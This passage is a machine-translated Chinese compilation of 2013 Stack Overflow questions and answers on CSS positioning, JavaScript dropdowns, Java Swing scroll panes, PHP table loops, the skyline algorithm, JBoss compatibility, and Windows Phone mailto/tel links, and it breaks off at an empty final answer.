我只想拥有： - 顶部的完整标题，即#Top，将顶部的整个区域从左到右（宽度：100％）。- 在#Top 标题中，我想显示一些通过#Navi 完成的链接。但是我想在#Top 的右下角显示#Navi。所以我想我会做#Top来定位相对和#Navi position:absolute，但它不起作用。- 然后我希望链接颜色为白色，但不知何故它不起作用 - 为什么？- 为什么我需要使用我认为不酷的？不使用完整的#Navi div 将不会显示！

非常感谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T10:19:52.633

尝试给#Navi
bottom:0px 和 right:0px;

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T10:24:42.497

```
#Top {
    width:100%;
    min-height:100px;
    height:15%;
    max-height:200px;
    background-color:#C6E466;
    border-bottom-width:2px;
    border-bottom-style:solid;
    border-bottom-color:#4E6011;
    position:relative;
}
#Navi {
    width:100%;
    position:absolute;
    bottom: 0px;
}
.Link {
    height:20px;
    margin-left:10px;
    min-width:150px;
    width:10%;
    max-width:200px;
    background-color:#121212;
    color:white;
    text-decoration:none;
    float: right;
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-20T11:15:18.717

不知道你在尝试什么，但这里有一个链接：http: [//jsfiddle.net/4JdmH/](http://jsfiddle.net/4JdmH/)

```
<div id="Top">
    <div id="Navi">
        <div class="Link">
            <a href="index.php?s=link1">link1</a>
        </div>
        <div class="Link">
            <a href="index.php?s=link2">link2</a>
        </div>
        <div class="clr"></div>
    </div>
</div>

#Top {
width:100%;
min-height:100px;
height:15%;
max-height:200px;
background-color:#C6E466;
border-bottom: 2px solid #4E6011;
position:relative;
}
#Navi {
position:absolute;
bottom:0px;
right:0px;
}
.Link {
height:20px;
margin-left:10px;
min-width:150px;
width:10%;
max-width:200px;
float:left;
background-color:#121212;
color:white;
text-decoration:none;
}
.clr {
    clear: both;
} 
```

# android - Android 3d赛车游戏，如何将轨道和物体向后移动？

> ID：14977333
> 
> 赞同：-1
> 
> 时间：2013-02-20T10:17:37.660
> 
> 标签：android

游戏对象（如路边的树木和岩石）如何在主要对象（自行车）向前移动时向后移动。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T10:33:46.657

也许我误解了你，但对我来说，你问的是 3D 图形的基础知识。把世界想象成物体和相机的集合。您可以单独移动每个对象。您也可以移动相机，当您这样做时，会导致整个场景在屏幕上移动。

现在，您应该将相机连接到自行车上并将它们一起移动。这将导致自行车在场景中移动，看起来所有的东西都在向后移动。

# javascript - 显示或隐藏 div 内容的下拉菜单不起作用

> ID：14977334
> 
> 赞同：1
> 
> 时间：2013-02-20T10:17:38.983
> 
> 标签：javascript, html

我不明白为什么这个脚本不起作用：

```
<select name="options" id="options">
  <option value="divname1"> Loan Protection Insurance</option>
  <option value="divname2"> GAP or Cash Assist Insurance</option>
  <option value="divname3"> Home Insurance</option>
  <option value="divname4"> Landlords Insurance</option>
  <option value="divname5"> Car Insurance</option>
</select>

<div id="divname1" style="display: block">Test 1</div>
<div id="divname2">Test 2</div>
<div id="divname3">Test 3</div>
<div id="divname4">Test 4</div>
<div id="divname5">Test 5</div>

document.getElementById('id-of-select').onchange = function() {
    var i = 1;
    var myDiv = document.getElementById("divname" + i);
    while(myDiv) {
        myDiv.style.display = 'none';
        myDiv = document.getElementById("divname" + ++i);
    }
    document.getElementById(this.value).style.display = 'block';
};

div {
display: none;   
} 
```

这是代码 [http://jsfiddle.net/2ukyA/7/](http://jsfiddle.net/2ukyA/7/)

但是我可以让这个代码工作 [http://jsfiddle.net/2ukyA/](http://jsfiddle.net/2ukyA/)

但我想在一个页面上拥有多个这些，所以我需要一些不仅仅是基于数字的东西。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T10:55:18.133

而不是手动隐藏所有 div，您可以隐藏`<div>`与先前选择的值相关的内容。您可以在其中存储一个关联数组（如地图），对于给定的`<select>`id，最后选择的值，甚至是`<div>`id。在`onchange`事件处理程序中，只需在地图中隐藏`<div>`id 并显示新的。

`<option>`请注意，您仍然需要在 id 和id之间建立关联（如果它们相同，则为隐式，如果将其存储在数组中，则为显式）`<div>`。

请参阅此[JSFiddle](http://jsfiddle.net/2ukyA/19/)中的示例。

在这个例子中，有一个多维关联数组（一种映射的映射），它存储`<option>`每个 s的 s `<select>`。每个`<option>`还与`<div>`它在选择时显示的 id 相关联。这个相同的数组用于存储先前选择的数组值（在条目中`previousValue`）。

请注意，关联数组的定义是在 javacsript 中静态完成的，但它可以从外部 JSON 文件或 AJAX 请求中动态检索。元素也可以动态构建，`<select>`但您需要更多信息（即选项描述）。

Javascript：

```
var selectDivOptions= 
    {select1:  
     { 
        option11: 'div11',
        option12: 'div12',
        option13: 'div13'
     }, 
     select2:  { 
         option21: 'div21',
         option22: 'div22',
         option23: 'div23'
     } 
    };

for (var key in selectDivOptions){
    var element = document.getElementById(key);
    element.onchange = selectChange;
}

function selectChange(){
    // Hide the div pointed by the previous value
    var previousValue = selectDivOptions[this.id]['previousValue'];
    if (previousValue){
        document.getElementById(previousValue).style.display = 'none';
    }

    // Show the div
    var divToShow = selectDivOptions[this.id][this.value];
    if (divToShow){
        document.getElementById(divToShow).style.display='block';
    }
    // Store the current value as the previous value
    selectDivOptions[this.id]['previousValue'] = divToShow;
} 
```

HTML

```
<select name="options" id="select1">
  <option value="option11"> Option 11</option>
  <option value="option12"> Option 12</option>
  <option value="option13"> Option 13</option>
</select>

<div id="div11">Div 11</div>
<div id="div12">Div 12</div> 
<div id="div13">Div 13</div> 

<br />
<select name="options2" id="select2">
  <option value="option21"> Option 21</option>
  <option value="option22"> Option 22</option>
  <option value="option23"> Option 23</option>
</select>
<div id="div21">Div 21</div>
<div id="div22">Div 22</div> 
<div id="div23">Div 23</div> 
```

# java - JScrollPanel 不显示滚动

> ID：14977336
> 
> 赞同：0
> 
> 时间：2013-02-20T10:17:48.117
> 
> 标签：java, swing, jscrollpane, jscrollbar

我有一个尺寸为*500* X *500*的 JFrame ：它包含一个尺寸为*1000* X *1000的 JComponent，并且此 JComponent 包含在一个**始终存在滚动条*的 JScrollBar 中。截图 ![在此处输入图像描述](../Images/322c0a6d99da5356069719bf4186ec23.png)

编码

```
 /**component */
    public class LinesComponent extends JPanel 

    ....

    /***other class: CommandPanel contains the LinesComponents*/
    public class CommandPanel extends JPanel{
    ....

        private LinesComponent panel;

            /*JScrollPanel*/

            private void buildScrollPanel(Container container) {
                JScrollPane scroll = new JScrollPane(panel);
                scroll.setSize(1000,1000);
                scroll.setBorder(new LineBorder(Color.BLACK));
                scroll.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_ALWAYS);
                scroll.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
                container.add(scroll);
            }

        /**JFrame*/
            private void buildFrame(String title) {
                this.testFrame = new JFrame(title);
                this.testFrame.setLayout(new FlowLayout());
                this.testFrame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
                this.testFrame.setLocationRelativeTo(null);
                this.testFrame.setSize(500,500);
                this.testFrame.setBackground(EnumColor.BACKGROUND_PANEL.getValue());
            }

//end CommandPanel 
```

如屏幕截图所示，窗口有滚动条，但它不工作。

我试图改变*JPanel*和*JFrame*的尺寸，但情况并没有改变。

我知道当*JComponent*的尺寸大于*JPanel*容器的尺寸时会出现滚动，但是此刻我看到我丢失了一些信息，但我不明白是什么。

请问您有什么建议吗？

PS进入屏幕截图我显示滚动不起作用，但在我的*需求*中，滚动必须在垂直和水平意义上工作

PS PS我所有的代码都在一个班级里

```
package testDebug;

import java.awt.Color;
import java.awt.Container;
import java.awt.Dimension;
import java.awt.FlowLayout;
import java.awt.Graphics;
import java.awt.GridLayout;
import java.awt.LayoutManager;
import java.awt.event.ActionListener;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;

import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTextField;
import javax.swing.ScrollPaneConstants;
import javax.swing.border.LineBorder;

public class AllClasses {

    public static void main(String[] a){
        CommandPanel commandPanel=new CommandPanel("test", new ArrayList<MyPoint>());
    }
}

class LinesComponent extends JPanel{

    private static final long serialVersionUID = 1L;
    private final LinkedList<Line> lines = new LinkedList<Line>();

    private static class Line {
        final int x1;//x del primo punto
        final int y1;//y del primo punto
        final int x2;//x del secondo punto
        final int y2;//y del secondo punto
        final Color color;
        final int pressure;

        public Line(int x1, int y1, int x2, int y2, Color color) {
            this.x1 = x1;
            this.y1 = y1;
            this.x2 = x2;
            this.y2 = y2;
            this.color = color;
            this.pressure=3;
        }

        public Line(int x1, int y1, int x2, int y2, int newPressure, Color color) {
            this.x1 = x1;
            this.y1 = y1;
            this.x2 = x2;
            this.y2 = y2;
            this.pressure=newPressure;
            this.color = color;
        }
    }//Line

    public LinesComponent(){
        setBorder(new LineBorder(Color.BLACK));
        setBackground(Color.WHITE);
        setPreferredSize(new Dimension(400, 400));
    }

    public void clearLines() {
        this.lines.clear();
        repaint();
    }

    @Override
    protected void paintComponent(Graphics g) {
        super.paintComponent(g);
        for (Line line : this.lines) {
            g.setColor(line.color);
            g.fillOval(line.x1,line.y1, line.pressure, line.pressure);
        }
    }
    public void addPoint(MyPoint p, Color randomColor) {
        //call addLine(double x, double y, double xtilt, double ytilt,  Color randomColor);
    }

    private void addLine(double x, double y, double xtilt, double ytilt,    Color randomColor) {
        this.lines.add(new Line((int) x, (int) y, (int) xtilt, (int) ytilt, randomColor));
        repaint();
    }

    }
enum EnumButton {

    DECREASE_X("-"),
    INCREASE_X("+"),
    DECREASE_Y("-"),
    INCREASE_Y("+"),
    DECREASE_ZOOM("-"),
    INCREASE_ZOOM("+");

    private JButton button;

    public JButton button(){
        return this.button;
    }

    private EnumButton(String s){
        this.button=new JButton(s);
    }

    public void addActionListener(ActionListener a){
        this.button().addActionListener(a);
    }
}

class CommandPanel extends JPanel {

    private static final long serialVersionUID = 1L;

    private static final String INITIAL_POSITION="0";
    private JFrame testFrame = null;
    private LinesComponent panelSignature;
    private JTextField positionX=new JTextField(5);
    private JTextField positionY=new JTextField(5);

    public CommandPanel(String title, List<MyPoint> newPoints) {
        super();
        positionX.setText(INITIAL_POSITION);
        positionY.setText(INITIAL_POSITION);
        buildFrame(title);
        Container container = testFrame.getContentPane();
        this.panelSignature=initPanel();

        buildScrollPanel(container);
        paintLine(newPoints);

        allignButtons();
        defineFrame();
    }

    private void buildScrollPanel(Container container) {
        JScrollPane scroll = new JScrollPane(panelSignature);
        scroll.setSize(300,300);
        scroll.setBorder(new LineBorder(Color.BLACK));
        scroll.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_ALWAYS);
        scroll.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
        container.add(scroll);
    }

    private void defineFrame() {
        this.testFrame.pack();
        this.testFrame.setVisible(true);
    }

    private void paintLine(List<MyPoint> points) {
        Iterator<MyPoint> iterator = points.iterator();
        while (iterator.hasNext()) {
            MyPoint point = iterator.next();
            this.panelSignature.addPoint(point,Color.BLUE);
        }
    }//disegnaLinea

    private void allignButtons() {
        JPanel buttonPanel = new JPanel(new FlowLayout());
        sectionHorizontalMovement(buttonPanel);
        sectionVerticalMovement(buttonPanel);
        sectionZoom(buttonPanel);
        this.testFrame.add(buttonPanel);
    }

    private void sectionZoom(JPanel buttonPanel) {
        buttonPanel.add(EnumLabel.ZOOM.label());
        buttonPanel.add(EnumButton.INCREASE_ZOOM.button());
        buttonPanel.add(EnumButton.DECREASE_ZOOM.button());
        buttonPanel.add(EnumLabel.ZOOM_DIRECTION.label());
        buttonPanel.add(EnumLabel.EMPTY.label());

    }//sezioneZoom

    private void sectionVerticalMovement(JPanel pannelloPulsanti) {
        pannelloPulsanti.add(EnumLabel.MOVE_UP_DOWN.label());
        pannelloPulsanti.add(EnumButton.INCREASE_Y.button());
        pannelloPulsanti.add(EnumButton.DECREASE_Y.button());
        pannelloPulsanti.add(EnumLabel.Y_DIRECTION.label());
        pannelloPulsanti.add(EnumLabel.MAX_Y_ALLOWED.label());
    }//sezioneSpostamentoVerticale

    private void sectionHorizontalMovement(JPanel pannelloPulsanti) {
        pannelloPulsanti.add(EnumLabel.MOVE_RIGHT_LEFT.label());
        pannelloPulsanti.add(EnumButton.INCREASE_X.button());
        pannelloPulsanti.add(EnumButton.DECREASE_X.button());
        pannelloPulsanti.add(EnumLabel.X_DIRECTION.label());
        pannelloPulsanti.add(EnumLabel.MAX_X_ALLOWED.label());
    }//sezioneSpostamentoOrizzontale

    public LinesComponent initPanel() {
        LinesComponent linesComponent= new LinesComponent();
        linesComponent.setBorder(new LineBorder(Color.GRAY));
        return linesComponent;
    }

    private void buildFrame(String titolo) {
        this.testFrame = new JFrame(titolo);
        this.testFrame.setLayout(new FlowLayout());
        this.testFrame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        this.testFrame.setLocationRelativeTo(null);
        this.testFrame.setSize(700,700);
        this.testFrame.setBackground(Color.WHITE);
    }
}
enum EnumLayout {

    FRAME(new FlowLayout()), BUTTON_PANEL(new GridLayout(3, 5));

    private LayoutManager value;

    private EnumLayout(LayoutManager manager){
        this.value=manager;
    }

    public LayoutManager layout() {
        return value;
    }

}

enum EnumLabel {
    MOVE_RIGHT_LEFT("Sposta in orizzontale"),
    MOVE_UP_DOWN("Sposta in verticale"),
    ZOOM("Zoom"), EMPTY(""),
    MAX_X_ALLOWED("LARGHEZZA: 600"), MAX_Y_ALLOWED("ALTEZZA: 600"),
    X_DIRECTION("0"), Y_DIRECTION("0"), ZOOM_DIRECTION("1")
    ;

    private JLabel label;

    private EnumLabel(String lab){
        this.label=new JLabel(lab);
    } 

    public  JLabel label (){
        return this.label;
    }
}
class MyPoint {
    // class with the data: useless for position of panel
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-20T10:49:41.170

Scrollpane and its scrollbars entirely rely on the size of the component in the viewport, which, by default, depends of the preferred size of that component.

Check this code which shows you a basic example of how this all works:

```
import java.awt.Color;
import java.awt.Dimension;
import java.awt.Graphics;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

import javax.swing.JFrame;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.SwingUtilities;
import javax.swing.Timer;

public class TestScrollPane {

    public static class CustomComponent extends JPanel {

        private static final int RADIUS = 20;
        private int x = 0;
        private int y = 0;

        private double speed = 18;
        private double dx;
        private double dy;

        public CustomComponent() {
            dx = speed;
            dy = speed;
            Timer t = new Timer(20, new ActionListener() {

                @Override
                public void actionPerformed(ActionEvent e) {
                    x += dx;
                    y += dy;
                    if (x + RADIUS > getWidth()) {
                        x = getWidth() - RADIUS;
                        dx = -speed;
                    } else if (x < 0) {
                        x = 0;
                        dx = speed;
                    }
                    if (y + RADIUS > getHeight()) {
                        y = getHeight() - RADIUS;
                        dy = -speed;
                    } else if (y < 0) {
                        y = 0;
                        dy = speed;
                    }
                    repaint();
                }
            });
            t.start();
        }

        @Override
        protected void paintComponent(Graphics g) {
            super.paintComponent(g);
            g.setColor(Color.RED);
            g.fillOval(x, y, RADIUS, RADIUS);
        }

        @Override
        public Dimension getPreferredSize() {
            return new Dimension(600, 600);
        }
    }

    protected void initUI() {
        JFrame window = new JFrame(TestScrollPane.class.getSimpleName());
        window.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        JScrollPane scroll = new JScrollPane(new CustomComponent(), JScrollPane.VERTICAL_SCROLLBAR_ALWAYS,
                JScrollPane.HORIZONTAL_SCROLLBAR_AS_NEEDED);
        window.add(scroll);
        window.setSize(600, 500);
        window.setVisible(true);
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(new Runnable() {
            @Override
            public void run() {
                new TestScrollPane().initUI();
            }
        });
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-20T10:40:05.713

可视区域/空间（在大多数情况下）由视图的首选大小定义。这表明您的问题在于您的滚动窗格视图，而不是滚动窗格或您提供给我们的任何其他内容

![在此处输入图像描述](../Images/e13656f8bfd34aef1b3d3672131e8eb1.png)

```
import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Dimension;
import java.awt.EventQueue;
import java.awt.Graphics;
import java.awt.GridBagLayout;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.UIManager;
import javax.swing.UnsupportedLookAndFeelException;

public class TestScrollPane02 {

    public static void main(String[] args) {
        new TestScrollPane02();
    }

    public TestScrollPane02() {
        EventQueue.invokeLater(new Runnable() {
            @Override
            public void run() {
                try {
                    UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
                } catch (ClassNotFoundException | InstantiationException | IllegalAccessException | UnsupportedLookAndFeelException ex) {
                }

                JFrame frame = new JFrame("Testing");
                frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
                frame.setLayout(new BorderLayout());
                frame.add(new JScrollPane(new LargePane()));
                frame.setSize(200, 200);
                frame.setLocationRelativeTo(null);
                frame.setVisible(true);
            }
        });
    }

    public class LargePane extends JPanel {

        public LargePane() {
            setLayout(new GridBagLayout());
            add(new JLabel("I'm a large panel"));
        }

        @Override
        public Dimension getPreferredSize() {
            return new Dimension(400, 400);
        }

        @Override
        protected void paintComponent(Graphics g) {
            super.paintComponent(g);
            g.setColor(Color.RED);
            g.drawLine(0, 0, getWidth(), getHeight());
            g.drawLine(getWidth(), 0, 0, getHeight());
        }

    }

} 
```

您还可以查看[Scrollable](http://docs.oracle.com/javase/7/docs/api/javax/swing/Scrollable.html)界面，该界面提供了返回到滚动窗格的其他提示...

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-02-20T10:21:03.910

实际上你的 JScrollPane 是 1000x1000px，所以如果有滚动条，你不会看到它们，因为你的框架是 500x500。请注意，JScrollPane 作用于其内容，这意味着如果您添加到其中的面板大于 JScrollPane 本身，它会显示滚动条，但如果容器较小，则不会添加滚动条。

# php - 如何使用while或for更改每五个单元格的表格行？

> ID：14977337
> 
> 赞同：0
> 
> 时间：2013-02-20T10:17:51.920
> 
> 标签：php

假设我们有一个查询，它给出了数据库记录的结果。我想把这些记录放在一张桌子上，但不像一行接一行。我想制作一个表格，每五个单元格就会改变一行。我该如何使用`while`or来做到这一点`for`？

这只是我现在所做的一个例子，但我不能让它在每五个单元格上改变一行......

```
<table>
<tr>
<?php $count = 0; while ($count <= 5){ ?>
<td><?php echo $id[$count]->id; $usrname[$count]->usrname;</td>
<?php $count++;}?>
</tr>
</table> 
```

任何想法？？？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-20T10:24:56.117

使用[模运算](http://en.wikipedia.org/wiki/Modulo_operation#Modulo_operation_expression)：

```
if($count % 5 == 4) {
  // end the current row, and start a new one
  echo "</tr><tr>"; 
```

它除以`$count`5 并取余数。因此，每 5 步一次，它是 4（`$count`即 4、9、14 等），您可以为每 5 条记录生成不同的东西。

* * *

如果你在你的代码示例中应用它，你会得到这个：

```
<table>
<tr>
<?php
$count = 0;
while ($count <= 5) {
  if($count % 5 == 4) {
    // Generate a new row
    echo "<\tr><tr>";
  }
  ?><td><?php echo $id[$count]->id." ".$usrname[$count]->usrname;?></td><?php
  $count++;
}
?>
</tr>
</table> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-20T10:27:04.910

在 while 或 for 之前使用 array_chunk() 或设置为循环：

```
if($count % 5 == 0) {
   echo "</tr><tr>";
   $count = 0;
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-20T10:30:55.577

像这样的东西可以工作。您也可以将其与内部`for`循环结合使用。但是工作代码很大程度上取决于`Array`你在里面循环的内容。因此，您可能需要自定义以下代码以适合您的设置。

请注意，我消除了`While`循环，因为您没有提供实际的数组。`<tr>`你基本上可以放在它之前。

```
<table>

    // you may start your while loop here
    <tr>
        <td><?php echo $id[$count]->id; $usrname[$count]->usrname; $count++; ?></td>
        <td><?php echo $id[$count]->id; $usrname[$count]->usrname; $count++; ?></td>
        <td><?php echo $id[$count]->id; $usrname[$count]->usrname; $count++; ?></td>
        <td><?php echo $id[$count]->id; $usrname[$count]->usrname; $count++; ?></td>
        <td><?php echo $id[$count]->id; $usrname[$count]->usrname; $count++; ?></td>
    </tr>

</table> 
```

# c# - 合并天际线，分而治之

> ID：14977339
> 
> 赞同：5
> 
> 时间：2013-02-20T10:17:53.370
> 
> 标签：c#, algorithm, data-structures, divide-and-conquer

我正在尝试解决著名的天际线问题（见 gif）：

![](../Images/516ada04ff4cd8e3c7bcd3ba99657763.png) 输入

> (1,11,5), (2,6,7), (3,13,9), (12,7,16), (14,3,25), (19,18,22), (23) ,13,29), (24,4,28)

应该返回，其他建筑物后面的点应该消失，并且 Y 轴变化的坐标应该在返回的天际线中：

> (1, 11), (3, 13), (9, 0), (12, 7), (16, 3), (19, 18), (22, 3), (23, 13), (29 , 0)

我试图通过对算法使用分而治之的方法来实现 O(n lg n) 的运行时间，但我被困在合并部分。

每次我想起来我都会感到困惑。例如，我检查天际线首先是哪一个，例如哪个具有较低的 x 坐标，然后我将 + 它的高度添加到我的新天际线。但是后来我遇到了在另外两个天际线后面的天际线，我怎样才能检测到这种“碰撞”？

我是否首先通过检查 left.x2 < right.x1 来检查天际线是否有任何重叠？但后来我想我应该先检查什么？x 轴上的优先级重叠，一切都变成了一个巨大的鸡蛋混乱。

也许我想得太复杂了？我需要的是一组最高的 y 坐标，在每个路口，我应该这样接近它吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-02-20T11:06:28.033

我认为这应该是一种更容易理解的方法：

*   将 x 坐标拆分为每个矩形的开始和结束对象，如下所示：

    ```
    rect(x1, y, x2) -> (x1, y, "start", reference to rect),
                       (x2, y, "finish", reference to rect) 
    ```

    所以像：

    ```
    class MyStruct
    {
       Rectangle rect;
       int x, y;
       bool isStart;
    } 
    ```

*   按 x 坐标 ( `O(n log n)`)对这些对象进行排序
*   创建一组（最初为空）矩形（将按 y 坐标排序，例如[BST](http://en.wikipedia.org/wiki/Binary_search_tree)）
*   循环遍历这些对象（按现在排序的顺序）（`O(n)`）
    *   每当遇到一个开始
        *   将矩形添加到矩形集 ( `O(log n)`)
        *   如果它是新的最高矩形，则将该起点添加到输出 ( `O(1)`)
    *   每当遇到完成
        *   从矩形集中移除矩形 ( `O(log n)`)
        *   如果它是最高的矩形，则在集合中找到下一个最高的矩形并将该点添加`(current.finishX, new.y)`到输出 ( `O(1)`) （如果集合为空，则添加`(current.finishX, 0)`到输出）

所以`O(n log n)`。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-02-09T15:15:35.537

这可以通过修改归并排序算法来实现。天际线的算法如下所示：

**构建天际线**

```
 ConstructSkyLine(List B ) --------------- O(nlogn)
    {
        If(B.size() == 1)
        {
            List skyLineList = new List();
            SKYLINE = new SKYLINE(B.XL, B.XR, B.H);
            skyLineList.add(SKYLINE);
            Return skyLineList;
        }
        B1, B2 <-- Split(B);
        List S1 <-- ConstructSkyLine(B1);
        List S2 <-- ConstructSkyLine(B2);
        List S <-- MergeSkyline(S1, S2);
        Return S;
    } 
```

**合并天际线**

```
 MergeSkyline(List S1, List S2) --------------- O(n)
    {
        List< SKYLINEENTRY> skylineEntryList = new ArrayList<SKYLINEENTRY>();
        while (S1.isEmpty() && S2.isEmpty())--------------- O(n)
        {
           S1Item <-- S1.get(0);
           S2Item <-- S2.get(0);
           If (S1Item.XL < S2Item.XL)
           {
             Merge(S1, S2, skylineEntryList);   --------------- O(n)
           }
           Else
           {
             Merge(S2, S1, skylineEntryList); --------------- O(n)
           }
         }

         If(!S1.isEmpty())
         {
            skylineEntryList.add(S1);
         }

         If(!S2.isEmpty())
         {
           skylineEntryList.add(S2);
         }
         Retrun skylineEntryList;
      } 
```

**合并**

```
 Merge(S1, S2, skylineEntryList) --------------- O(n)
  {
    SKYLINEENTRY <-- null;
    S1Item <-- S1.get(0);
    S2Item <-- S2.get(0);
    SKYLINEENTRY.XL = S1Item.XL;
    If(S1Item.XR > S2Item.XL) // means over lap 
    {
        If(S1Item.H > S2Item.H) // S1 is higher.
        {
           SKYLINEENTRY.XR = S1Item.XR;
           SKYLINEENTRY.H = S1Item.H;
           S1.remove(S1Item); --------------- O(n)
           skylineEntryList.add(SKYLINEENTRY);
           if(S2Item.XR < S1Item.XR) // full overlap
           {
              S2.remove(S2Item); --------------- O(n)
           }
           Else // partial overlap
           {
              S2Item.XL <-- S1Item.XR;
           }            
        }
        Else //S2 is higher
        {
           SKYLINEENTRY.XR = S2Item.XL;
           SKYLINEENTRY.H = S1Item.H;
           if(S2Item.XR < S1Item.XR) // full overlap with S2
           {
              S1Item.XL = S2Item.XR;
           }
           Else // partial overlap
           {
              S1.remove(S1Item); --------------- O(n)
           }    
           skylineEntryList.add(SKYLINEENTRY);  
        }   
     }
     Else // no overlap
     {
        SKYLINEENTRY.XR = S1Item.XR;
        SKYLINEENTRY.H = S1Item.H;
        S1.remove(S1Item); --------------- O(n)
        skylineEntryList.add(SKYLINEENTRY);
     }
  } 
```

# java - JBoss 7.1（最新的 Jboss）是否与 Java 7 兼容

> ID：14977341
> 
> 赞同：0
> 
> 时间：2013-02-20T10:17:56.183
> 
> 标签：java, jboss, jboss7.x

需要开发服务以部署在最新版本的 JBoss 上，不确定我是否可以使用 Java 7。最初决定编译到Java 6。但是真的很想用Java 7，我可以这样做。Jboss 会支持 Java 7 的特性吗？罗马

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-02-20T10:32:14.637

直接来自[入门指南](https://docs.jboss.org/author/display/AS71/Getting+Started+Guide#GettingStartedGuide-Requirements)：

> # 要求
> 
> Java SE 6 或更高版本（我们建议您使用可用的最新更新）
> 
> Java SE 7 可以与 JBoss AS 7 一起使用

# php - php://输出无效

> ID：14977344
> 
> 赞同：2
> 
> 时间：2013-02-20T10:18:05.043
> 
> 标签：php, http-headers, fopen

我将生成一个 csv 文件到 php 输出，因此用户可以立即下载它：

```
header( 'Content-Type: text/csv' );
header( 'Content-Disposition: attachment; filename=' . $filename );
$fp = fopen('php://ouput', 'w'); // Here is where error happens, line 156
if(!$fp) var_dump($fp); // output: bool(false) 
```

但它会产生以下错误：

```
Warning: fopen(): Invalid php:// URL specified in /home/mustafa/xxx/includes/functions.php on line 156
Warning: fopen(php://ouput): failed to open stream: operation failed in /home/mustafa/xxx/includes/functions.php on line 156 
```

为什么`php://output`无效

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-20T10:19:07.637

改变这个

```
$fp = fopen('php://ouput', 'w'); 
```

到

```
$fp = fopen('php://output', 'w');
                     ^ // you missed `t` 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-20T10:19:46.183

`fopen()`写入文件。`php://ouput`不是有效的文件名/U​​RL。它是[php://output](http://php.net/manual/en/wrappers.php.php)，您缺少一个“t”。

如果要将输出发送到客户端（浏览器），只需使用`echo`.

# windows-phone-7 - webbrowser windows phone + tel 和 mailto 标签不起作用

> ID：14977347
> 
> 赞同：1
> 
> 时间：2013-02-20T10:18:16.437
> 
> 标签：windows-phone-7, xaml, webbrowser-control, windows-phone-8

我正在使用 webbrowder 来呈现 html 字符串。

```
private void webBrowserHTML_Loaded(object sender, RoutedEventArgs e)
        {
            WebBrowser web = sender as WebBrowser;
            string description = web.DataContext.ToString();
            web.NavigateToString(description);
        } 
```

在这个 html 中，我有标签 tel 和 mailto：

```
<a href="mailto:xxxx@xx.xx"> Envoyer un email </a> 
<a href="tel:+33102030405"> Appeler la société xxx </a> 
```

当我点击号码时我的问题，我不打电话给它，当我点击邮件时没有打开我的outlook！！

请问有什么解决办法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T13:43:23.247

不幸`mailto:`的是， Windows Phone 上`tel:`的控件不支持。`WebBrowser`

您可以做的是在 HTML 中注入 Javascript，它将枚举所有`a`标签并连接一个`onclick`事件。该事件将调用，而该事件`window.external.Notify`又将引发 的`ScriptNotify`事件，`WebBrowser`并将 URL 作为参数。

这有点复杂，但我认为这是在 Windows Phone 上处理这些 mailto 和 tel 协议的唯一选择。

这是代码：

```
 // Constructor
    public MainPage()
    {
        InitializeComponent();

        browser.IsScriptEnabled = true;
        browser.ScriptNotify += browser_ScriptNotify;
        browser.Loaded += browser_Loaded;
    }

    void browser_Loaded(object sender, RoutedEventArgs e)
    {
        // Sample HTML code
        string html = @"<html><head></head><body><a href='mailto:test@test.com'>Envoyer un email</a><a href='tel:+3301010101'>Appeler</a></body></html>";

        // Script that will call raise the ScriptNotify via window.external.Notify
        string notifyJS = @"<script type='text/javascript' language='javascript'>
                                window.onload = function() {
                                    var links = document.getElementsByTagName('a');
                                    for(var i=0;i<links.length;i++) {
                                        links[i].onclick = function() {
                                            window.external.Notify(this.href);
                                        }
                                    }
                                }
                            </script>";

        // Inject the Javascript into the head section of the HTML document
        html = html.Replace("<head>", string.Format("<head>{0}{1}", Environment.NewLine, notifyJS));

        browser.NavigateToString(html);
    }

    void browser_ScriptNotify(object sender, NotifyEventArgs e)
    {
        if (!string.IsNullOrEmpty(e.Value))
        {
            string href = e.Value.ToLower();
            if (href.StartsWith("mailto:"))
            {
                EmailComposeTask email =  new EmailComposeTask();
                email.To = href.Replace("mailto:", string.Empty);
                email.Show();
            }
            else if (href.StartsWith("tel:"))
            {
                PhoneCallTask call = new PhoneCallTask();
                call.PhoneNumber = href.Replace("tel:", string.Empty);
                call.Show();
            }
        }
    } 
```

* * *

## 回答 #2

> 赞同：1
> 
